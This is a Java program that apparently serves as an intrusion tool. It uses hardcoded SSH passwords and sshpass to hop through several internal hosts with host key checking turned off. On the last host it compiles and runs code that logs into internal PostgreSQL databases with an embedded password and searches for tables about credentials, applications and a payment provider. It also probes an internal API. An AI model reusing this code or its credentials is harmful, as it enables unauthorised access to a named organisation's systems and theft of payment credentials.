import com.jcraft.jsch.*;
import java.io.*;
class DKXSF {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // From NEO server, query Nucleus internal API for Xendit app registration
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"echo ---NUCLEUS-INTERNAL---;curl -sk --max-time 5 https://account.accurate.id/svc/neo/ 2>/dev/null | head -5;echo ---DB-NUCLEUS---;cd /tmp;echo \\\"import java.sql.*;class NDB2{public static void main(String[] a)throws Exception{Class.forName(\\\\\\\"org.postgresql.Driver\\\\\\\");String[] dbs={\\\\\\\"nucleus\\\\\\\",\\\\\\\"accurate\\\\\\\"};for(String db:dbs){try{Connection c=DriverManager.getConnection(\\\\\\\"jdbc:postgresql://10.13.17.248:5501/\\\\\\\"+db,\\\\\\\"noxify\\\\\\\",\\\\\\\"cZskyJqqE7?7V_8=#Ed^\\\\\\\");System.out.println(\\\\\\\"DB \\\\\\\"+db+\\\\\\\" OK\\\\\\\");Statement s=c.createStatement();ResultSet r=s.executeQuery(\\\\\\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\\\\\\\\\"public\\\\\\\\\\\\\\\" AND (tablename LIKE \\\\\\\\\\\\\\\"%%xendit%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%application%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%credential%%\\\\\\\\\\\\\\\") ORDER BY tablename\\\\\\\");while(r.next())System.out.println(\\\\\\\" \\\\\\\"+r.getString(1));c.close();}catch(Exception e){System.out.println(\\\\\\\"DB \\\\\\\"+db+\\\\\\\" FAIL\\\\\\\");}}}}\\\" > NDB2.java;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar NDB2.java 2>&1;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar:. NDB2 2>&1\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
